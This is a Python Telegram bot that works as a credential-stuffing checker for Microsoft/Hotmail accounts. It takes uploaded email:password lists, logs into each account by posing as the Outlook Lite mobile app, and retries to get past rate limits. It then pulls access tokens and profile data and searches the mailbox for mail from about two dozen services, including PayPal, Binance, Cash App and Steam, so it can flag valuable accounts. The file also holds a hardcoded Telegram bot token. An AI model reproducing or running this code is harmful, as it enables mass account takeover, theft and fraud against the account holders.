import requests
import telebot
import threading
from telebot.types import InlineKeyboardButton as but, InlineKeyboardMarkup as key
import requests, types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from telebot import types
import os
import telebot 
import re, json
import time, random
import string
from datetime import datetime, timedelta
from faker import Faker
from multiprocessing import Process
import threading
import user_agent, ast
import asyncio, datetime
import io
import os, uuid, concurrent.futures
try:
    import requests
    from rich.console import Console
    from rich.panel import Panel
except ImportError:
    os.system('pip install requests rich')
    os.system('clear')  

a, b = 0, 0
a = 0
correct_count = 0
incorrect_count = 0
token1 = '7196328739:AAH7JzdUEvWm2VbrPAO4HxkHDwzHHhmRnAo'
id = '6196885948'
command_usage = {}
stopuser = {}
token = token1
bot = telebot.TeleBot(token, parse_mode="HTML")

# Store the last processed account details globally
last_account_details = {}

# Function to safely send Telegram messages
def safe_send_message(chat_id, text, parse_mode="HTML", reply_markup=None):
    try:
        bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"Telegram API error: {e}")
        # Fallback: send without parse_mode if HTML fails
        try:
            bot.send_message(chat_id, text, parse_mode=None, reply_markup=reply_markup)
        except Exception as e:
            print(f"Fallback Telegram API error: {e}")

# Function to safely edit Telegram messages
def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", reply_markup=None):
    try:
        bot.edit_message_text(text, chat_id, message_id, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"Telegram API edit error: {e}")
        # Fallback: send a new message instead of editing
        safe_send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)

@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f'𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘀𝗲𝗻𝗱 𝗺𝗲 𝗮 𝗳𝗶𝗹𝗲 𝗰𝗼𝗻𝘁𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗵𝗲 𝗵𝗼𝘁𝗺𝗮𝗶𝗹 𝗰𝗼𝗺𝗯𝗼')

@bot.message_handler(content_types=["document"])
def main(message):
    keyboard = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text=f"𝗖𝗛𝗘𝗖𝗞𝗘𝗥", callback_data='br')
    keyboard.add(contact_button)
    safe_send_message(message.chat.id, f'𝗖𝗛𝗢𝗢𝗦𝗘 𝗧𝗛𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬', reply_markup=keyboard)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open(f"{id}-combo.txt", "wb") as w:
        w.write(ee)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
    id = call.from_user.id
    stopuser[f'{id}']['status'] = 'stop'
    safe_send_message(call.from_user.id, text='𝗗𝗢𝗡𝗘 𝗕𝗢𝗧 𝗦𝗧𝗢𝗣𝗣𝗘𝗗')

@bot.callback_query_handler(func=lambda call: call.data == 'br')
def menu_callback(call):
    def my_function():
        id = call.from_user.id
        global a, b, last_account_details
        a = 0
        b = 0
        try:
            with open(f"{id}-combo.txt", 'r') as file:
                lino = file.readlines()
                total = len(lino)
            stopuser[f'{id}']['status'] = 'start'
        except Exception as e:
            print(f"Error reading combo file: {e}")
            stopuser[f'{id}'] = {'status': 'start'}
            return

        downloaded_file = f'{id}-combo.txt'
        with open(downloaded_file, 'r', encoding='utf-8') as file:
            accounts = file.read()
        accounts_list = accounts.splitlines()
        for line in accounts_list:
            if stopuser[f'{id}']['status'] == 'stop':
                safe_send_message(call.from_user.id, text='𝗗𝗢𝗡𝗘 𝗕𝗢𝗧 𝗦𝗧𝗢𝗣𝗣𝗘𝗗')
                return
            if ":" not in line:
                print(f"Skipping invalid line: {line}")
                continue
            email, password = line.strip().split(':', 1)
            headers = {
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "return-client-request-id": "false",
                "client-request-id": "205740b4-7709-4500-a45b-b8e12f66c738",
                "x-ms-sso-ignore-sso": "1",
                "correlation-id": str(uuid.uuid4()),
                "x-client-ver": "1.1.0+9e54a0d1",
                "x-client-os": "28",
                "x-client-sku": "MSAL.xplat.android",
                "x-client-src-sku": "MSAL.xplat.android",
                "X-Requested-With": "com.microsoft.outlooklite",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-User": "?1",
                "Sec-Fetch-Dest": "document",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
            }
            # Retry logic for initial request
            for attempt in range(3):
                try:
                    response = requests.get("https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint="+str(email)+"&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D", headers=headers)
                    if response.status_code == 429:
                        print(f"Rate limited for {email}. Retrying after delay...")
                        time.sleep(random.uniform(5, 10))
                        continue
                    cok = response.cookies.get_dict()
                    if "urlPost:'" not in response.text or 'name="PPFT" id="i0327" value="' not in response.text:
                        print(f"Invalid response for {email}. Skipping...")
                        continue
                    URL = response.text.split("urlPost:'")[1].split("'")[0]
                    PPFT = response.text.split('name="PPFT" id="i0327" value="')[1].split("',")[0]
                    AD = response.url.split('haschrome=1')[0]
                    MSPRequ = cok.get('MSPRequ', '')
                    uaid = cok.get('uaid', '')
                    RefreshTokenSso = cok.get('RefreshTokenSso', '')
                    MSPOK = cok.get('MSPOK', ''),
                    OParams = cok.get('OParams', '')
                    break
                except Exception as e:
                    print(f"Error in initial request for {email}: {e}")
                    time.sleep(random.uniform(1, 3))
                    continue
            else:
                print(f"Failed to get initial response for {email} after 3 attempts. Skipping...")
                continue

            try:
                lenn = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={PPFT}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"
                Ln = len(lenn)
                headers = {
                    "Host": "login.live.com",
                    "Connection": "keep-alive",
                    "Content-Length": str(Ln),
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://login.live.com",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36 PKeyAuth/1.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "X-Requested-With": "com.microsoft.outlooklite",
                    "Sec-Fetch-Site": "same-origin",
                    "Sec-Fetch-Mode": "navigate",
                    "Sec-Fetch-User": "?1",
                    "Sec-Fetch-Dest": "document",
                    "Referer": f"{AD}haschrome=1",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cookie": f"MSPRequ={MSPRequ};uaid={uaid}; RefreshTokenSso={RefreshTokenSso}; MSPOK={MSPOK}; OParams={OParams}; MicrosoftApplicationsTelemetryDeviceId={uuid}"}
                # Retry logic for login request
                for attempt in range(3):
                    try:
                        res = requests.post(URL, data=lenn, headers=headers, allow_redirects=False)
                        if res.status_code == 429:
                            print(f"Rate limited for {email} on login. Retrying after delay...")
                            time.sleep(random.uniform(5, 10))
                            continue
                        break
                    except Exception as e:
                        print(f"Error in login request for {email}: {e}")
                        time.sleep(random.uniform(1, 3))
                        continue
                else:
                    print(f"Failed to login for {email} after 3 attempts. Skipping...")
                    continue

                cook = res.cookies.get_dict()
                hh = res.headers
                if any(key in cook for key in ["JSH", "JSHP", "ANON", "WLSSC"]) or res.text == '':
                    a += 1
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"{email}:{password}", callback_data='u8')
                    status = types.InlineKeyboardButton(f"{a}| 𝗛𝗜𝗧𝗦 ✅", callback_data='u8')
                    cm2 = types.InlineKeyboardButton(f"{b}| 𝗕𝗔𝗗 ❌", callback_data='u8')
                    sto = types.InlineKeyboardButton(f"𝗧𝗢𝗧𝗔𝗟 𝗟𝗜𝗡𝗘𝗦: {total}", callback_data='lion')
                    stop = types.InlineKeyboardButton(f"STOP", callback_data='stop')
                    mes.add(cm1, status, cm2, sto, stop)
                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)
                else:
                    b += 1
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"{email}:{password}", callback_data='u8')
                    status = types.InlineKeyboardButton(f"{a}| 𝗛𝗜𝗧𝗦 ✅", callback_data='u8')
                    cm2 = types.InlineKeyboardButton(f"{b}| 𝗕𝗔𝗗 ❌", callback_data='u8')
                    sto = types.InlineKeyboardButton(f"𝗧𝗢𝗧𝗔𝗟 𝗟𝗜𝗡𝗘𝗦: {total}", callback_data='lion')
                    stop = types.InlineKeyboardButton(f"STOP", callback_data='stop')
                    mes.add(cm1, status, cm2, sto, stop)
                    safe_edit_message(call.message.chat.id, call.message.message_id, f'''𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗜𝗡𝗚''', reply_markup=mes)

                # Check if Location header exists before splitting
                location = hh.get('Location')
                if location is None:
                    print(f"Skipping account {email}:{password} - No Location header in response")
                    continue
                try:
                    Code = location.split('code=')[1].split('&')[0]
                except IndexError:
                    print(f"Skipping account {email}:{password} - Invalid Location header format")
                    continue

                CID = cook.get('MSPCID', '').upper()
                if not CID:
                    print(f"Skipping account {email}:{password} - No MSPCID in cookies")
                    continue

                url = "https://login.microsoftonline.com/consumers/oauth2/v2.0/token"
                data = {
                    "client_info": "1",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": Code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                }
                # Retry logic for token request
                for attempt in range(3):
                    try:
                        response = requests.post(url, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
                        if response.status_code == 429:
                            print(f"Rate limited for {email} on token request. Retrying after delay...")
                            time.sleep(random.uniform(5, 10))
                            continue
                        token = response.json().get("access_token")
                        if not token:
                            print(f"Skipping account {email}:{password} - No access token in response")
                            continue
                        break
                    except Exception as e:
                        print(f"Error in token request for {email}: {e}")
                        time.sleep(random.uniform(1, 3))
                        continue
                else:
                    print(f"Failed to get token for {email} after 3 attempts. Skipping...")
                    continue

                he = {
                    "User-Agent": "Outlook-Android/2.0",
                    "Pragma": "no-cache",
                    "Accept": "application/json",
                    "ForceSync": "false",
                    "Authorization": f"Bearer {token}",
                    "X-AnchorMailbox": f"CID:{CID}",
                    "Host": "substrate.office.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip"
                }
                # Retry logic for profile request
                for attempt in range(3):
                    try:
                        r = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=he).json()
                        break
                    except Exception as e:
                        print(f"Error in profile request for {email}: {e}")
                        time.sleep(random.uniform(1, 3))
                        continue
                else:
                    print(f"Failed to get profile for {email} after 3 attempts. Skipping...")
                    continue

                info_name = r.get('names', [])
                info_Loca = r.get('accounts', [])
                name = info_name[0]['displayName'] if info_name else "Unknown"
                Loca = info_Loca[0]['location'] if info_Loca else "Unknown"

                url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
                headers = {
                    "Host": "outlook.live.com",
                    "content-length": "0",
                    "x-owa-sessionid": f"{CID}",
                    "x-req-source": "Mini",
                    "authorization": f"Bearer {token}",
                    "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                    "action": "StartupData",
                    "x-owa-correlationid": f"{CID}",
                    "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                    "content-type": "application/json; charset=utf-8",
                    "accept": "*/*",
                    "origin": "https://outlook.live.com",
                    "x-requested-with": "com.microsoft.outlooklite",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://outlook.live.com/",
                    "accept-encoding": "gzip, deflate",
                    "accept-language": "en-US,en;q=0.9"
                }
                # Retry logic for startup data request
                for attempt in range(3):
                    try:
                        rese = requests.post(url, headers=headers, data="").text
                        break
                    except Exception as e:
                        print(f"Error in startup data request for {email}: {e}")
                        time.sleep(random.uniform(1, 3))
                        continue
                else:
                    print(f"Failed to get startup data for {email} after 3 attempts. Skipping...")
                    continue

                V1 = '𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 ✅️' if 'security@facebookmail.com' in rese else None
                V2 = '𝗜𝗡𝗦𝗧𝗔𝗚𝗥𝗔𝗠 ✅️' if 'security@mail.instagram.com' in rese else None
                V3 = '𝗣𝗨𝗕𝗚 ✅️' if "noreply@pubgmobile.com" in rese else None
                V4 = '𝗞𝗢𝗡𝗔𝗠𝗜 ✅ '  if 'nintendo-noreply@ccg.nintendo.com' in rese else None
                V5 = '𝗧𝗜𝗞𝗧𝗢𝗞 ✅️' if 'register@account.tiktok.com' in rese else None
                V6 = '𝗧𝗪𝗜𝗧𝗧𝗘𝗥 ✅️' if 'info@x.com' in rese else None
                V7 = '𝗣𝗔𝗬𝗣𝗔𝗟 ✅️' if 'service@paypal.com.br' in rese else None
                V8 = '𝗕𝗜𝗡𝗔𝗡𝗖𝗘 ✅️' if 'do-not-reply@ses.binance.com' in rese else None
                V9 = '𝗡𝗘𝗧𝗙𝗟𝗜𝗫 ✅️' if 'info@account.netflix.com' in rese else None
                V10 = '𝗣𝗟𝗔𝗬𝗦𝗧𝗔𝗧𝗜𝗢𝗡 ✅️' if 'reply@txn-email.playstation.com' in rese else None
                V11 = '𝗦𝗨𝗣𝗘𝗥𝗖𝗘𝗟𝗟 ✅️' if 'noreply@id.supercell.com' in rese else None
                V12 = '𝗘𝗣𝗜𝗖 𝗚𝗔𝗠𝗘𝗦 ✅️' if 'help@acct.epicgames.com' in rese else None
                V13 = '𝗦𝗣𝗢𝗧𝗜𝗙𝗬 ✅️' if 'no-reply@spotify.com' in rese else None
                V14 = '𝗥𝗢𝗖𝗞𝗦𝗧𝗔𝗥 ✅️' if 'noreply@rockstargames.com' in rese else None
                V15 = '𝗫𝗕𝗢𝗫 ✅️' if 'xboxreps@engage.xbox.com' in rese else None
                V16 = '𝗠𝗜𝗖𝗥𝗢𝗦𝗢𝗙𝗧 ✅️' if 'account-security-noreply@accountprotection.microsoft.com' in rese else None
                V17 = '𝗦𝗧𝗘𝗔𝗠 ✅️' if 'noreply@steampowered.com' in rese else None
                V18 = '𝗥𝗢𝗕𝗟𝗢𝗫 ✅️' if 'accounts@roblox.com' in rese else None
                V19 = '𝗘𝗔 𝗦𝗣𝗢𝗥𝗧𝗦 ✅️' if 'EA@e.ea.com' in rese else None
                V20 = '𝗕𝗜𝗧𝗞𝗨𝗕 ✅️' if 'no-reply@bitkub.com' in rese else None
                V21 = '𝗛𝗢𝗦𝗧𝗜𝗡𝗚𝗘𝗥 ✅️' if '‏no-reply@account.hostinger.com‏' in rese else None
                V22 = '𝗢𝗡𝗟𝗬𝗙𝗔𝗡𝗦 ✅️' if 'support@onlyfans.com' in rese else None
                V23 = '𝗟𝗜𝗡𝗞𝗘𝗗𝗜𝗡 ✅️' if 'messages-noreply@linkedin.com' in rese else None
                V24 = 'CASHAPP ✅️' if 'cash@square.com' in rese else None
                h = filter(None, [V1, V2, V3, V4, V5, V6, V7, V8, V9, V10, V11, V12, V13, V14, V15, V16, V17, V18, V19, V20, V21, V22, V23, V24])
                hh = "\n".join(h)
                ff = f'''
[ -𝗧𝗛𝗘𝗧𝗔- ]
[ϟ] 𝗘𝗠𝗔𝗜𝗟: {email}
[ϟ] 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: {password}
[ϟ] 𝗡𝗔𝗠𝗘: {name}
[ϟ] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {Loca}  
---𝗦𝗜𝗧𝗘𝗦------
{hh}
'''
                last_account_details[id] = ff
                safe_send_message(call.message.chat.id, ff)
            except Exception as e:
                print(f"Error processing {email}:{password}: {e}")
                continue

    thread = threading.Thread(target=my_function)
    thread.start()

@bot.callback_query_handler(func=lambda call: call.data == 'u8')
def button_callback(call):
    id = call.from_user.id
    if id in last_account_details:
        safe_send_message(call.message.chat.id, last_account_details[id])
    else:
        safe_send_message(call.message.chat.id, "𝗡𝗢 𝗔𝗖𝗖𝗢𝗨𝗡𝗧𝗦 𝗛𝗔𝗩𝗘 𝗕𝗘𝗘𝗡 𝗣𝗥𝗢𝗖𝗖𝗘𝗦𝗦𝗘𝗗")

@bot.callback_query_handler(func=lambda call: call.data == 'lion')
def menu_callback(call):
    try:
        bot.answer_callback_query(call.id, "File number button clicked.")
    except Exception as e:
        print(f"Error in lion callback: {e}")

print("تم تشغيل البوت")
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Bot polling error: {e}")
        time.sleep(5)  # Wait before retrying to avoid rapid failure loops
